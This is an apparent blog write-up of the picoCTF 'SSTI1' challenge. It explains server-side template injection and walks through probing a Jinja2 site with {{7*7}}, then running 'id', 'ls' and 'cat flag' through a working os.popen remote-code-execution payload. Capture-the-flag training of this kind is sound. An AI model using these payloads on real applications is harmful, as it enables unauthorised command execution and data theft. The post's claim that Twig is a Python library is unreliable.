In this article, I will go through my thought process and the steps I took to complete my first PicoCTF challenge, which is the Web Exploitation SSTI1 challenge. SSTI stands for Server-side Template Injection, which is a type of vulnerability where an attacker injects malicious template expressions into input fields that gets processed by the server’s template engine. [This vulnerability causes risks such as information disclosure, remote code execution (RCE) and could grant access to sensitive server-side data such as user data, configuration files and session tokens stored in server memory.](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection?) Hence why it is crucial to put measures in place to prevent such attacks.
![Problem Description](https://blog.cbarkr.com/media/ctf/picoCTF/SSTI1/description.png)
Once the challenge starts, By clicking **Check out my website here!**, we arrive at this page:
![Home](https://blog.cbarkr.com/media/ctf/picoCTF/SSTI1/home.png)

It’s implied that this website is vulnerable to SSTI, or server side template injection. Websites use template engines to create dynamic content, and SSTI vulnerabilities arise when user-supplied input is supplied to these template engines. Malicious actors may exploit this to inject code into the site.
![Diagram](https://blog.cbarkr.com/media/ctf/picoCTF/SSTI1/engine.png)

To see if we can execute code, we can simply try some operation and put it in brackets to see if it will execute. I tried executing `{7*7}` and it didn’t work, so I added extra brackets and it worked!
![{{7*7}}](https://blog.cbarkr.com/media/ctf/picoCTF/SSTI1/7x7.png)
![result](https://blog.cbarkr.com/media/ctf/picoCTF/SSTI1/49.png)
Note that `7*7` was evaluated! Then for `{{7*'7'}}`:
![777777](https://blog.cbarkr.com/media/ctf/picoCTF/SSTI1/7777777.png)
Similarly, the input was evaluated. Therefore, this site is in fact vulnerable, and is using either `Jinja2` or `Twig`. Both options are Python libraries, hence our payload will consist of Python.
If we try something like `{{request}}`, we can access the request object itself:
![resuest method](https://blog.cbarkr.com/media/ctf/picoCTF/SSTI1/request_result.png)
I used a payload found on this blogpost: [onsecurity](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/). I tried the a payload that allows RCE bypassing and it worked:
```
{{request.application.__globals__.__builtins__.__import__(‘os’).popen(‘id’).read()}}
```
![ssti1_ID.png](images/ssti1_ID.png)
Now we can go back and tweak some of the data to see what else we can find. I tried replacing “id” (this is a Linux system command that prints out user and group information for the current user) to “ls” like on a Linux terminal to see the files and directories in the current working directory:
```
{{request.application.__globals__.__builtins__.__import__(‘os’).popen(‘ls’).read()}}
```
![SSTI1_ls.png](images/SSTI1_ls.png)
We can see that there is a “flag” file, which most likely contains the flag for this challenge, so I want to see the content of that file. To do so, I use the Linux command cat and then the name of the file (flag) in the payload:
`{{request.application.__globals__.__builtins__.__import__(‘os’).popen(‘cat flag’).read()}}`
![flag.png](images/flag.png)

#### Challenge completed!
